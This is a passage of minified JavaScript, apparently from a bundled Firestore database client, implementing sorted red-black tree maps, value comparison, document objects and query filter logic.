dR{constructor(e,n){this.previousValue=e,n&&(n.sequenceNumberHandler=r=>this.ae(r),this.ue=r=>n.writeSequenceNumber(r))}ae(e){return this.previousValue=Math.max(e,this.previousValue),this.previousValue}next(){const e=++this.previousValue;return this.ue&&this.ue(e),e}}dR.ce=-1;const HM=-1;function fR(t){return t==null}function AI(t){return t===0&&1/t==-1/0}function hVe(t){return typeof t=="number"&&Number.isInteger(t)&&!AI(t)&&t<=Number.MAX_SAFE_INTEGER&&t>=Number.MIN_SAFE_INTEGER}const nfe="";function pVe(t){let e="";for(let n=0;n<t.length;n++)e.length>0&&(e=Ene(e)),e=mVe(t.get(n),e);return Ene(e)}function mVe(t,e){let n=e;const r=t.length;for(let i=0;i<r;i++){const s=t.charAt(i);switch(s){case"\0":n+="";break;case nfe:n+="";break;default:n+=s}}return n}function Ene(t){return t+nfe+""}function _ne(t){let e=0;for(const n in t)Object.prototype.hasOwnProperty.call(t,n)&&e++;return e}function fy(t,e){for(const n in t)Object.prototype.hasOwnProperty.call(t,n)&&e(n,t[n])}function rfe(t){for(const e in t)if(Object.prototype.hasOwnProperty.call(t,e))return!1;return!0}class Yr{constructor(e,n){this.comparator=e,this.root=n||_s.EMPTY}insert(e,n){return new Yr(this.comparator,this.root.insert(e,n,this.comparator).copy(null,null,_s.BLACK,null,null))}remove(e){return new Yr(this.comparator,this.root.remove(e,this.comparator).copy(null,null,_s.BLACK,null,null))}get(e){let n=this.root;for(;!n.isEmpty();){const r=this.comparator(e,n.key);if(r===0)return n.value;r<0?n=n.left:r>0&&(n=n.right)}return null}indexOf(e){let n=0,r=this.root;for(;!r.isEmpty();){const i=this.comparator(e,r.key);if(i===0)return n+r.left.size;i<0?r=r.left:(n+=r.left.size+1,r=r.right)}return-1}isEmpty(){return this.root.isEmpty()}get size(){return this.root.size}minKey(){return this.root.minKey()}maxKey(){return this.root.maxKey()}inorderTraversal(e){return this.root.inorderTraversal(e)}forEach(e){this.inorderTraversal(((n,r)=>(e(n,r),!1)))}toString(){const e=[];return this.inorderTraversal(((n,r)=>(e.push(`${n}:${r}`),!1))),`{${e.join(", ")}}`}reverseTraversal(e){return this.root.reverseTraversal(e)}getIterator(){return new PT(this.root,null,this.comparator,!1)}getIteratorFrom(e){return new PT(this.root,e,this.comparator,!1)}getReverseIterator(){return new PT(this.root,null,this.comparator,!0)}getReverseIteratorFrom(e){return new PT(this.root,e,this.comparator,!0)}}class PT{constructor(e,n,r,i){this.isReverse=i,this.nodeStack=[];let s=1;for(;!e.isEmpty();)if(s=n?r(e.key,n):1,n&&i&&(s*=-1),s<0)e=this.isReverse?e.left:e.right;else{if(s===0){this.nodeStack.push(e);break}this.nodeStack.push(e),e=this.isReverse?e.right:e.left}}getNext(){let e=this.nodeStack.pop();const n={key:e.key,value:e.value};if(this.isReverse)for(e=e.left;!e.isEmpty();)this.nodeStack.push(e),e=e.right;else for(e=e.right;!e.isEmpty();)this.nodeStack.push(e),e=e.left;return n}hasNext(){return this.nodeStack.length>0}peek(){if(this.nodeStack.length===0)return null;const e=this.nodeStack[this.nodeStack.length-1];return{key:e.key,value:e.value}}}class _s{constructor(e,n,r,i,s){this.key=e,this.value=n,this.color=r??_s.RED,this.left=i??_s.EMPTY,this.right=s??_s.EMPTY,this.size=this.left.size+1+this.right.size}copy(e,n,r,i,s){return new _s(e??this.key,n??this.value,r??this.color,i??this.left,s??this.right)}isEmpty(){return!1}inorderTraversal(e){return this.left.inorderTraversal(e)||e(this.key,this.value)||this.right.inorderTraversal(e)}reverseTraversal(e){return this.right.reverseTraversal(e)||e(this.key,this.value)||this.left.reverseTraversal(e)}min(){return this.left.isEmpty()?this:this.left.min()}minKey(){return this.min().key}maxKey(){return this.right.isEmpty()?this.key:this.right.maxKey()}insert(e,n,r){let i=this;const s=r(e,i.key);return i=s<0?i.copy(null,null,null,i.left.insert(e,n,r),null):s===0?i.copy(null,n,null,null,null):i.copy(null,null,null,null,i.right.insert(e,n,r)),i.fixUp()}removeMin(){if(this.left.isEmpty())return _s.EMPTY;let e=this;return e.left.isRed()||e.left.left.isRed()||(e=e.moveRedLeft()),e=e.copy(null,null,null,e.left.removeMin(),null),e.fixUp()}remove(e,n){let r,i=this;if(n(e,i.key)<0)i.left.isEmpty()||i.left.isRed()||i.left.left.isRed()||(i=i.moveRedLeft()),i=i.copy(null,null,null,i.left.remove(e,n),null);else{if(i.left.isRed()&&(i=i.rotateRight()),i.right.isEmpty()||i.right.isRed()||i.right.left.isRed()||(i=i.moveRedRight()),n(e,i.key)===0){if(i.right.isEmpty())return _s.EMPTY;r=i.right.min(),i=i.copy(r.key,r.value,null,null,i.right.removeMin())}i=i.copy(null,null,null,null,i.right.remove(e,n))}return i.fixUp()}isRed(){return this.color}fixUp(){let e=this;return e.right.isRed()&&!e.left.isRed()&&(e=e.rotateLeft()),e.left.isRed()&&e.left.left.isRed()&&(e=e.rotateRight()),e.left.isRed()&&e.right.isRed()&&(e=e.colorFlip()),e}moveRedLeft(){let e=this.colorFlip();return e.right.left.isRed()&&(e=e.copy(null,null,null,null,e.right.rotateRight()),e=e.rotateLeft(),e=e.colorFlip()),e}moveRedRight(){let e=this.colorFlip();return e.left.left.isRed()&&(e=e.rotateRight(),e=e.colorFlip()),e}rotateLeft(){const e=this.copy(null,null,_s.RED,null,this.right.left);return this.right.copy(null,null,this.color,e,null)}rotateRight(){const e=this.copy(null,null,_s.RED,this.left.right,null);return this.left.copy(null,null,this.color,null,e)}colorFlip(){const e=this.left.copy(null,null,!this.left.color,null,null),n=this.right.copy(null,null,!this.right.color,null,null);return this.copy(null,null,!this.color,e,n)}checkMaxDepth(){const e=this.check();return Math.pow(2,e)<=this.size+1}check(){if(this.isRed()&&this.left.isRed())throw Ft(43730,{key:this.key,value:this.value});if(this.right.isRed())throw Ft(14113,{key:this.key,value:this.value});const e=this.left.check();if(e!==this.right.check())throw Ft(27949);return e+(this.isRed()?0:1)}}_s.EMPTY=null,_s.RED=!0,_s.BLACK=!1;_s.EMPTY=new class{constructor(){this.size=0}get key(){throw Ft(57766)}get value(){throw Ft(16141)}get color(){throw Ft(16727)}get left(){throw Ft(29726)}get right(){throw Ft(36894)}copy(e,n,r,i,s){return this}insert(e,n,r){return new _s(e,n)}remove(e,n){return this}isEmpty(){return!0}inorderTraversal(e){return!1}reverseTraversal(e){return!1}minKey(){return null}maxKey(){return null}isRed(){return!1}checkMaxDepth(){return!0}check(){return 0}};class qi{constructor(e){this.comparator=e,this.data=new Yr(this.comparator)}has(e){return this.data.get(e)!==null}first(){return this.data.minKey()}last(){return this.data.maxKey()}get size(){return this.data.size}indexOf(e){return this.data.indexOf(e)}forEach(e){this.data.inorderTraversal(((n,r)=>(e(n),!1)))}forEachInRange(e,n){const r=this.data.getIteratorFrom(e[0]);for(;r.hasNext();){const i=r.getNext();if(this.comparator(i.key,e[1])>=0)return;n(i.key)}}forEachWhile(e,n){let r;for(r=n!==void 0?this.data.getIteratorFrom(n):this.data.getIterator();r.hasNext();)if(!e(r.getNext().key))return}firstAfterOrEqual(e){const n=this.data.getIteratorFrom(e);return n.hasNext()?n.getNext().key:null}getIterator(){return new Ane(this.data.getIterator())}getIteratorFrom(e){return new Ane(this.data.getIteratorFrom(e))}add(e){return this.copy(this.data.remove(e).insert(e,!0))}delete(e){return this.has(e)?this.copy(this.data.remove(e)):this}isEmpty(){return this.data.isEmpty()}unionWith(e){let n=this;return n.size<e.size&&(n=e,e=this),e.forEach((r=>{n=n.add(r)})),n}isEqual(e){if(!(e instanceof qi)||this.size!==e.size)return!1;const n=this.data.getIterator(),r=e.data.getIterator();for(;n.hasNext();){const i=n.getNext().key,s=r.getNext().key;if(this.comparator(i,s)!==0)return!1}return!0}toArray(){const e=[];return this.forEach((n=>{e.push(n)})),e}toString(){const e=[];return this.forEach((n=>e.push(n))),"SortedSet("+e.toString()+")"}copy(e){const n=new qi(this.comparator);return n.data=e,n}}class Ane{constructor(e){this.iter=e}getNext(){return this.iter.getNext().key}hasNext(){return this.iter.hasNext()}}class Du{constructor(e){this.fields=e,e.sort(Ts.comparator)}static empty(){return new Du([])}unionWith(e){let n=new qi(Ts.comparator);for(const r of this.fields)n=n.add(r);for(const r of e)n=n.add(r);return new Du(n.toArray())}covers(e){for(const n of this.fields)if(n.isPrefixOf(e))return!0;return!1}isEqual(e){return Y1(this.fields,e.fields,((n,r)=>n.isEqual(r)))}}class ife extends Error{constructor(){super(...arguments),this.name="Base64DecodeError"}}class xs{constructor(e){this.binaryString=e}static fromBase64String(e){const n=(function(i){try{return atob(i)}catch(s){throw typeof DOMException<"u"&&s instanceof DOMException?new ife("Invalid base64 string: "+s):s}})(e);return new xs(n)}static fromUint8Array(e){const n=(function(i){let s="";for(let o=0;o<i.length;++o)s+=String.fromCharCode(i[o]);return s})(e);return new xs(n)}[Symbol.iterator](){let e=0;return{next:()=>e<this.binaryString.length?{value:this.binaryString.charCodeAt(e++),done:!1}:{value:void 0,done:!0}}}toBase64(){return(function(n){return btoa(n)})(this.binaryString)}toUint8Array(){return(function(n){const r=new Uint8Array(n.length);for(let i=0;i<n.length;i++)r[i]=n.charCodeAt(i);return r})(this.binaryString)}approximateByteSize(){return 2*this.binaryString.length}compareTo(e){return pn(this.binaryString,e.binaryString)}isEqual(e){return this.binaryString===e.binaryString}}xs.EMPTY_BYTE_STRING=new xs("");const gVe=new RegExp(/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(?:\.(\d+))?Z$/);function $p(t){if(Kn(!!t,39018),typeof t=="string"){let e=0;const n=gVe.exec(t);if(Kn(!!n,46558,{timestamp:t}),n[1]){let i=n[1];i=(i+"000000000").substr(0,9),e=Number(i)}const r=new Date(t);return{seconds:Math.floor(r.getTime()/1e3),nanos:e}}return{seconds:pi(t.seconds),nanos:pi(t.nanos)}}function pi(t){return typeof t=="number"?t:typeof t=="string"?Number(t):0}function Hp(t){return typeof t=="string"?xs.fromBase64String(t):xs.fromUint8Array(t)}const sfe="server_timestamp",ofe="__type__",afe="__previous_value__",cfe="__local_write_time__";function zM(t){return(t?.mapValue?.fields||{})[ofe]?.stringValue===sfe}function hR(t){const e=t.mapValue.fields[afe];return zM(e)?hR(e):e}function M_(t){const e=$p(t.mapValue.fields[cfe].timestampValue);return new kr(e.seconds,e.nanos)}class yVe{constructor(e,n,r,i,s,o,a,c,l,f){this.databaseId=e,this.appId=n,this.persistenceKey=r,this.host=i,this.ssl=s,this.forceLongPolling=o,this.autoDetectLongPolling=a,this.longPollingOptions=c,this.useFetchStreams=l,this.isUsingEmulator=f}}const CI="(default)";class U_{constructor(e,n){this.projectId=e,this.database=n||CI}static empty(){return new U_("","")}get isDefaultDatabase(){return this.database===CI}isEqual(e){return e instanceof U_&&e.projectId===this.projectId&&e.database===this.database}}const ufe="__type__",bVe="__max__",NT={mapValue:{}},lfe="__vector__",SI="value";function zp(t){return"nullValue"in t?0:"booleanValue"in t?1:"integerValue"in t||"doubleValue"in t?2:"timestampValue"in t?3:"stringValue"in t?5:"bytesValue"in t?6:"referenceValue"in t?7:"geoPointValue"in t?8:"arrayValue"in t?9:"mapValue"in t?zM(t)?4:vVe(t)?9007199254740991:wVe(t)?10:11:Ft(28295,{value:t})}function rd(t,e){if(t===e)return!0;const n=zp(t);if(n!==zp(e))return!1;switch(n){case 0:case 9007199254740991:return!0;case 1:return t.booleanValue===e.booleanValue;case 4:return M_(t).isEqual(M_(e));case 3:return(function(i,s){if(typeof i.timestampValue=="string"&&typeof s.timestampValue=="string"&&i.timestampValue.length===s.timestampValue.length)return i.timestampValue===s.timestampValue;const o=$p(i.timestampValue),a=$p(s.timestampValue);return o.seconds===a.seconds&&o.nanos===a.nanos})(t,e);case 5:return t.stringValue===e.stringValue;case 6:return(function(i,s){return Hp(i.bytesValue).isEqual(Hp(s.bytesValue))})(t,e);case 7:return t.referenceValue===e.referenceValue;case 8:return(function(i,s){return pi(i.geoPointValue.latitude)===pi(s.geoPointValue.latitude)&&pi(i.geoPointValue.longitude)===pi(s.geoPointValue.longitude)})(t,e);case 2:return(function(i,s){if("integerValue"in i&&"integerValue"in s)return pi(i.integerValue)===pi(s.integerValue);if("doubleValue"in i&&"doubleValue"in s){const o=pi(i.doubleValue),a=pi(s.doubleValue);return o===a?AI(o)===AI(a):isNaN(o)&&isNaN(a)}return!1})(t,e);case 9:return Y1(t.arrayValue.values||[],e.arrayValue.values||[],rd);case 10:case 11:return(function(i,s){const o=i.mapValue.fields||{},a=s.mapValue.fields||{};if(_ne(o)!==_ne(a))return!1;for(const c in o)if(o.hasOwnProperty(c)&&(a[c]===void 0||!rd(o[c],a[c])))return!1;return!0})(t,e);default:return Ft(52216,{left:t})}}function L_(t,e){return(t.values||[]).find((n=>rd(n,e)))!==void 0}function Q1(t,e){if(t===e)return 0;const n=zp(t),r=zp(e);if(n!==r)return pn(n,r);switch(n){case 0:case 9007199254740991:return 0;case 1:return pn(t.booleanValue,e.booleanValue);case 2:return(function(s,o){const a=pi(s.integerValue||s.doubleValue),c=pi(o.integerValue||o.doubleValue);return a<c?-1:a>c?1:a===c?0:isNaN(a)?isNaN(c)?0:-1:1})(t,e);case 3:return Cne(t.timestampValue,e.timestampValue);case 4:return Cne(M_(t),M_(e));case 5:return kD(t.stringValue,e.stringValue);case 6:return(function(s,o){const a=Hp(s),c=Hp(o);return a.compareTo(c)})(t.bytesValue,e.bytesValue);case 7:return(function(s,o){const a=s.split("/"),c=o.split("/");for(let l=0;l<a.length&&l<c.length;l++){const f=pn(a[l],c[l]);if(f!==0)return f}return pn(a.length,c.length)})(t.referenceValue,e.referenceValue);case 8:return(function(s,o){const a=pn(pi(s.latitude),pi(o.latitude));return a!==0?a:pn(pi(s.longitude),pi(o.longitude))})(t.geoPointValue,e.geoPointValue);case 9:return Sne(t.arrayValue,e.arrayValue);case 10:return(function(s,o){const a=s.fields||{},c=o.fields||{},l=a[SI]?.arrayValue,f=c[SI]?.arrayValue,h=pn(l?.values?.length||0,f?.values?.length||0);return h!==0?h:Sne(l,f)})(t.mapValue,e.mapValue);case 11:return(function(s,o){if(s===NT.mapValue&&o===NT.mapValue)return 0;if(s===NT.mapValue)return 1;if(o===NT.mapValue)return-1;const a=s.fields||{},c=Object.keys(a),l=o.fields||{},f=Object.keys(l);c.sort(),f.sort();for(let h=0;h<c.length&&h<f.length;++h){const m=kD(c[h],f[h]);if(m!==0)return m;const b=Q1(a[c[h]],l[f[h]]);if(b!==0)return b}return pn(c.length,f.length)})(t.mapValue,e.mapValue);default:throw Ft(23264,{he:n})}}function Cne(t,e){if(typeof t=="string"&&typeof e=="string"&&t.length===e.length)return pn(t,e);const n=$p(t),r=$p(e),i=pn(n.seconds,r.seconds);return i!==0?i:pn(n.nanos,r.nanos)}function Sne(t,e){const n=t.values||[],r=e.values||[];for(let i=0;i<n.length&&i<r.length;++i){const s=Q1(n[i],r[i]);if(s)return s}return pn(n.length,r.length)}function J1(t){return DD(t)}function DD(t){return"nullValue"in t?"null":"booleanValue"in t?""+t.booleanValue:"integerValue"in t?""+t.integerValue:"doubleValue"in t?""+t.doubleValue:"timestampValue"in t?(function(n){const r=$p(n);return`time(${r.seconds},${r.nanos})`})(t.timestampValue):"stringValue"in t?t.stringValue:"bytesValue"in t?(function(n){return Hp(n).toBase64()})(t.bytesValue):"referenceValue"in t?(function(n){return Pt.fromName(n).toString()})(t.referenceValue):"geoPointValue"in t?(function(n){return`geo(${n.latitude},${n.longitude})`})(t.geoPointValue):"arrayValue"in t?(function(n){let r="[",i=!0;for(const s of n.values||[])i?i=!1:r+=",",r+=DD(s);return r+"]"})(t.arrayValue):"mapValue"in t?(function(n){const r=Object.keys(n.fields||{}).sort();let i="{",s=!0;for(const o of r)s?s=!1:i+=",",i+=`${o}:${DD(n.fields[o])}`;return i+"}"})(t.mapValue):Ft(61005,{value:t})}function tx(t){switch(zp(t)){case 0:case 1:return 4;case 2:return 8;case 3:case 8:return 16;case 4:const e=hR(t);return e?16+tx(e):16;case 5:return 2*t.stringValue.length;case 6:return Hp(t.bytesValue).approximateByteSize();case 7:return t.referenceValue.length;case 9:return(function(r){return(r.values||[]).reduce(((i,s)=>i+tx(s)),0)})(t.arrayValue);case 10:case 11:return(function(r){let i=0;return fy(r.fields,((s,o)=>{i+=s.length+tx(o)})),i})(t.mapValue);default:throw Ft(13486,{value:t})}}function Tne(t,e){return{referenceValue:`projects/${t.projectId}/databases/${t.database}/documents/${e.path.canonicalString()}`}}function BD(t){return!!t&&"integerValue"in t}function qM(t){return!!t&&"arrayValue"in t}function xne(t){return!!t&&"nullValue"in t}function Ine(t){return!!t&&"doubleValue"in t&&isNaN(Number(t.doubleValue))}function nx(t){return!!t&&"mapValue"in t}function wVe(t){return(t?.mapValue?.fields||{})[ufe]?.stringValue===lfe}function yE(t){if(t.geoPointValue)return{geoPointValue:{...t.geoPointValue}};if(t.timestampValue&&typeof t.timestampValue=="object")return{timestampValue:{...t.timestampValue}};if(t.mapValue){const e={mapValue:{fields:{}}};return fy(t.mapValue.fields,((n,r)=>e.mapValue.fields[n]=yE(r))),e}if(t.arrayValue){const e={arrayValue:{values:[]}};for(let n=0;n<(t.arrayValue.values||[]).length;++n)e.arrayValue.values[n]=yE(t.arrayValue.values[n]);return e}return{...t}}function vVe(t){return(((t.mapValue||{}).fields||{}).__type__||{}).stringValue===bVe}class Bc{constructor(e){this.value=e}static empty(){return new Bc({mapValue:{}})}field(e){if(e.isEmpty())return this.value;{let n=this.value;for(let r=0;r<e.length-1;++r)if(n=(n.mapValue.fields||{})[e.get(r)],!nx(n))return null;return n=(n.mapValue.fields||{})[e.lastSegment()],n||null}}set(e,n){this.getFieldsMap(e.popLast())[e.lastSegment()]=yE(n)}setAll(e){let n=Ts.emptyPath(),r={},i=[];e.forEach(((o,a)=>{if(!n.isImmediateParentOf(a)){const c=this.getFieldsMap(n);this.applyChanges(c,r,i),r={},i=[],n=a.popLast()}o?r[a.lastSegment()]=yE(o):i.push(a.lastSegment())}));const s=this.getFieldsMap(n);this.applyChanges(s,r,i)}delete(e){const n=this.field(e.popLast());nx(n)&&n.mapValue.fields&&delete n.mapValue.fields[e.lastSegment()]}isEqual(e){return rd(this.value,e.value)}getFieldsMap(e){let n=this.value;n.mapValue.fields||(n.mapValue={fields:{}});for(let r=0;r<e.length;++r){let i=n.mapValue.fields[e.get(r)];nx(i)&&i.mapValue.fields||(i={mapValue:{fields:{}}},n.mapValue.fields[e.get(r)]=i),n=i}return n.mapValue.fields}applyChanges(e,n,r){fy(n,((i,s)=>e[i]=s));for(const i of r)delete e[i]}clone(){return new Bc(yE(this.value))}}function dfe(t){const e=[];return fy(t.fields,((n,r)=>{const i=new Ts([n]);if(nx(r)){const s=dfe(r.mapValue).fields;if(s.length===0)e.push(i);else for(const o of s)e.push(i.child(o))}else e.push(i)})),new Du(e)}class Gs{constructor(e,n,r,i,s,o,a){this.key=e,this.documentType=n,this.version=r,this.readTime=i,this.createTime=s,this.data=o,this.documentState=a}static newInvalidDocument(e){return new Gs(e,0,qt.min(),qt.min(),qt.min(),Bc.empty(),0)}static newFoundDocument(e,n,r,i){return new Gs(e,1,n,qt.min(),r,i,0)}static newNoDocument(e,n){return new Gs(e,2,n,qt.min(),qt.min(),Bc.empty(),0)}static newUnknownDocument(e,n){return new Gs(e,3,n,qt.min(),qt.min(),Bc.empty(),2)}convertToFoundDocument(e,n){return!this.createTime.isEqual(qt.min())||this.documentType!==2&&this.documentType!==0||(this.createTime=e),this.version=e,this.documentType=1,this.data=n,this.documentState=0,this}convertToNoDocument(e){return this.version=e,this.documentType=2,this.data=Bc.empty(),this.documentState=0,this}convertToUnknownDocument(e){return this.version=e,this.documentType=3,this.data=Bc.empty(),this.documentState=2,this}setHasCommittedMutations(){return this.documentState=2,this}setHasLocalMutations(){return this.documentState=1,this.version=qt.min(),this}setReadTime(e){return this.readTime=e,this}get hasLocalMutations(){return this.documentState===1}get hasCommittedMutations(){return this.documentState===2}get hasPendingWrites(){return this.hasLocalMutations||this.hasCommittedMutations}isValidDocument(){return this.documentType!==0}isFoundDocument(){return this.documentType===1}isNoDocument(){return this.documentType===2}isUnknownDocument(){return this.documentType===3}isEqual(e){return e instanceof Gs&&this.key.isEqual(e.key)&&this.version.isEqual(e.version)&&this.documentType===e.documentType&&this.documentState===e.documentState&&this.data.isEqual(e.data)}mutableCopy(){return new Gs(this.key,this.documentType,this.version,this.readTime,this.createTime,this.data.clone(),this.documentState)}toString(){return`Document(${this.key}, ${this.version}, ${JSON.stringify(this.data.value)}, {createTime: ${this.createTime}}), {documentType: ${this.documentType}}), {documentState: ${this.documentState}})`}}class TI{constructor(e,n){this.position=e,this.inclusive=n}}function Rne(t,e,n){let r=0;for(let i=0;i<t.position.length;i++){const s=e[i],o=t.position[i];if(s.field.isKeyField()?r=Pt.comparator(Pt.fromName(o.referenceValue),n.key):r=Q1(o,n.data.field(s.field)),s.dir==="desc"&&(r*=-1),r!==0)break}return r}function Pne(t,e){if(t===null)return e===null;if(e===null||t.inclusive!==e.inclusive||t.position.length!==e.position.length)return!1;for(let n=0;n<t.position.length;n++)if(!rd(t.position[n],e.position[n]))return!1;return!0}class xI{constructor(e,n="asc"){this.field=e,this.dir=n}}function EVe(t,e){return t.dir===e.dir&&t.field.isEqual(e.field)}class ffe{}class ki extends ffe{constructor(e,n,r){super(),this.field=e,this.op=n,this.value=r}static create(e,n,r){return e.isKeyField()?n==="in"||n==="not-in"?this.createKeyFieldInFilter(e,n,r):new AVe(e,n,r):n==="array-contains"?new TVe(e,r):n==="in"?new xVe(e,r):n==="not-in"?new IVe(e,r):n==="array-contains-any"?new RVe(e,r):new ki(e,n,r)}static createKeyFieldInFilter(e,n,r){return n==="in"?new CVe(e,r):new SVe(e,r)}matches(e){const n=e.data.field(this.field);return this.op==="!="?n!==null&&n.nullValue===void 0&&this.matchesComparison(Q1(n,this.value)):n!==null&&zp(this.value)===zp(n)&&this.matchesComparison(Q1(n,this.value))}matchesComparison(e){switch(this.op){case"<":return e<0;case"<=":return e<=0;case"==":return e===0;case"!=":return e!==0;case">":return e>0;case">=":return e>=0;default:return Ft(47266,{operator:this.op})}}isInequality(){return["<","<=",">",">=","!=","not-in"].indexOf(this.op)>=0}getFlattenedFilters(){return[this]}getFilters(){return[this]}}class $u extends ffe{constructor(e,n){super(),this.filters=e,this.op=n,this.Pe=null}static create(e,n){return new $u(e,n)}matches(e){return hfe(this)?this.filters.find((n=>!n.matches(e)))===void 0:this.filters.find((n=>n.matches(e)))!==void 0}getFlattenedFilters(){return this.Pe!==null||(this.Pe=this.filters.reduce(((e,n)=>e.concat(n.getFlattenedFilters())),[])),this.Pe}getFilters(){return Object.assign([],this.filters)}}function hfe(t){return t.op==="and"}function pfe(t){return _Ve(t)&&hfe(t)}function _Ve(t){for(const e of t.filters)if(e instanceof $u)return!1;return!0}function jD(t){if(t instanceof ki)return t.field.canonicalString()+t.op.toString()+J1(t.value);if(pfe(t))return t.filters.map((e=>jD(e))).join(",");{const e=t.filters.map((n=>jD(n))).join(",");return`${t.op}(${e})`}}function mfe(t,e){return t instanceof ki?(function(r,i){return i instanceof ki&&r.op===i.op&&r.field.isEqual(i.field)&&rd(r.value,i.value)})(t,e):t instanceof $u?(function(r,i){return i instanceof $u&&r.op===i.op&&r.filters.length===i.filters.length?r.filters.reduce(((s,o,a)=>s&&mfe(o,i.filters[a])),!0):!1})(t,e):void Ft(19439)}function gfe(t){return t instanceof ki?(function(n){return`${n.field.canonicalString()} ${n.op} ${J1(n.value)}`})(t):t instanceof $u?(function(n){return n.op.toString()+" {"+n.getFilters().map(gfe).join(" ,")+"}"})(t):"Filter"}class AVe extends ki{constructor(e,n,r){super(e,n,r),this.key=Pt.fromName(r.referenceValue)}matches(e){const n=Pt.comparator(e.key,this.key);return this.matchesComparison(n)}}class CVe extends ki{constructor(e,n){super(e,"in",n),this.keys=yfe("in",n)}matches(e){return this.keys.some((n=>n.isEqual(e.key)))}}class SVe extends ki{constructor(e,n){super(e,"not-in",n),this.keys=yfe("not-in",n)}matches(e){return!this.keys.some((n=>n.isEqual(e.key)))}}function yfe(t,e){return(e.arrayValue?.values||[]).map((n=>Pt.fromName(n.referenceValue)))}class TVe extends ki{constructor(e,n){super(e,"array-contains",n)}matches(e){const n=e.data.field(this.field);return qM(n)&&L_(n.arrayValue,this.value)}}class xVe extends ki{constructor(e,n){super(e,"in",n)}matches(e){const n=e.data.field(this.field);return n!==null&&L_(this.value.arrayValue,n)}}class IVe extends ki{constructor(e,n){super(e,"not-in",n)}matches(e){if(L_(this.value.arrayValue,{nullValue:"NULL_VALUE"}))return!1;const n=e.data.field(this.field);return n!==null&&n.nullValue===void 0&&!L_(this.value.arrayValue,n)}}class RVe extends ki{constructor(e,n){super(e,"array-contains-any",n)}matches(e){const n=e.data.field(this.field);return!(!qM(n)||!n.arrayValue.values)&&n.arrayValue.values.some((r=>L_(this.value.arrayValue,r)))}}class PVe{constructor(e,n=null,r=[],i=[],s=null,o=null,a=null){this.path=e,this.collectionGroup=n,this.orderBy=r,this.filters=i,this.limit=s,this.startAt=o,this.endAt=a,this.Te=null}}function Nne(t,e=null,n=[],r=[],i=null,s=null,o=null){return new PVe(t,e,n,r,i,s,o)}function VM(t){const e=Gt(t);if(e.Te===null){let n=e.path.canonicalString();e.collectionGroup!==null&&(n+="|cg:"+e.collectionGroup),n+="|f:",n+=e.filters.map((r=>jD(r))).join(","),n+="|ob:",n+=e.orderBy.map((r=>(function(s){return s.field.canonicalString()+s.dir})(r))).join(","),fR(e.limit)||(n+="|l:",n+=e.limit),e.startAt&&(n+="|lb:",n+=e.startAt.inclusive?"b:":"a:",n+=e.startAt.position.map((r=>J1(r))).join(",")),e.endAt&&(n+="|ub:",n+=e.endAt.inclusive?"a:":"b:",n+=e.endAt.position.map((r=>J1(r))).join(",")),e.Te=n}return e.Te}function WM(t,e){if(t.limit!==e.limit||t.orderBy.length!==e.orderBy.length)return!1;for(let n=0;n<t.orderBy.length;n++)if(!EVe(t.orderBy[n],e.orderBy[n]))return!1;if(t.filters.length!==e.filters.length)return!1;for(let n=0;n<t.filters.length;n++)if(!mfe(t.filters[n],e.filters[n]))return!1;return t.collectionGroup===e.collectionGroup&&!!t.path.isEqual(e.path)&&!!Pne(t.startAt,e.startAt)&&Pne(t.endAt,e.endAt)}function MD(t){return Pt.isDocumentKey(t.path)&&t.collectionGroup===null&&t.filters.length===0}class i5{constructor(e,n=null,r=[],i=[],s=null,o="F",a=null,c=null){this.path=e,this.collectionGroup=n,this.explicitOrderBy=r,this.filters=i,this.limit=s,this.limitType=o,this.startAt=a,this.endAt=c,this.Ie=null,this.Ee=null,this.de=null,this.startAt,this.endAt}}function NVe(t,e,n,r,i,s,o,a){return new i5(t,e,n,r,i,s,o,a)}function pR(t){return new i5(t)}function One(t){return t.filters.length===0&&t.limit===null&&t.startAt==null&&t.endAt==null&&(t.explicitOrderBy.length===0||t.explicitOrderBy.length===1&&t.explicitOrderBy[0].field.isKeyField())}function bfe(t){return t.collectionGroup!==null}function bE(t){const e=Gt(t);if(e.Ie===null){e.Ie=[];const n=new Set;for(const s of e.explicitOrderBy)e.Ie.push(s),n.add(s.field.canonicalString());const r=e.explicitOrderBy.length>0?e.explicitOrderBy[e.explicitOrderBy.length-1].dir:"asc";(function(o){let a=new qi(Ts.comparator);return o.filters.forEach((c=>{c.getFlattenedFilters().forEach((l=>{l.isInequality()&&(a=a.add(l.field))}))})),a})(e).forEach((s=>{n.has(s.canonicalString())||s.isKeyField()||e.Ie.push(new xI(s,r))})),n.has(Ts.keyField().canonicalString())||e.Ie.push(new xI(Ts.keyField(),r))}return e.Ie}function zl(t){const e=Gt(t);return e.Ee||(e.Ee=OVe(e,bE(t))),e.Ee}function OVe(t,e){if(t.limitType==="F")return Nne(t.path,t.collectionGroup,e,t.filters,t.limit,t.startAt,t.endAt);{e=e.map((i=>{const s=i.dir==="desc"?"asc":"desc";return new xI(i.field,s)}));const n=t.endAt?new TI(t.endAt.position,t.endAt.inclusive):null,r=t.startAt?new TI(t.startAt.position,t.startAt.inclusive):null;return Nne(t.path,t.collectionGroup,e,t.filters,t.limit,n,r)}}function UD(t,e){const n=t.filters.concat([e]);return new i5(t.path,t.collectionGroup,t.explicitOrderBy.slice(),n,t.limit,t.limitType,t.startAt,t.endAt)}function LD(t,e,n){return new i5(t.path,t.collectionGroup,t.explicitOrderBy.slice(),t.filters.slice(),e,n,t.startAt,t.endAt)}function mR(t,e){return WM(zl(t),zl(e))&&t.limitType===e.limitType}function wfe(t){return`${VM(zl(t))}|lt:${t.limitType}`}function Lb(t){return`Query(target=${(function(n){let r=n.path.canonicalString();return n.collectionGroup!==null&&(r+=" collectionGroup="+n.collectionGroup),n.filters.length>0&&(r+=`, filters: [${n.filters.map((i=>gfe(i))).join(", ")}]`),fR(n.limit)||(r+=", limit: "+n.limit),n.orderBy.length>0&&(r+=`, orderBy: [${n.orderBy.map((i=>(function(o){return`${o.field.canonicalString()} (${o.dir})`})(i))).join(", ")}]`),n.startAt&&(r+=", startAt: ",r+=n.startAt.inclusive?"b:":"a:",r+=n.startAt.position.map((i=>J1(i))).join(",")),n.endAt&&(r+=", endAt: ",r+=n.endAt.inclusive?"a:":"b:",r+=n.endAt.position.map((i=>J1(i))).join(",")),`Target(${r})`})(zl(t))}; limitType=${t.limitType})`}function gR(t,e){return e.isFoundDocument()&&(function(r,i){const s=i.key.path;return r.collectionGroup!==null?i.key.hasCollectionId(r.collectionGroup)&&r.path.isPrefixOf(s):Pt.isDocumentKey(r.path)?r.path.isEqual(s):r.path.isImmediateParentOf(s)})(t,e)&&(function(r,i){for(const s of 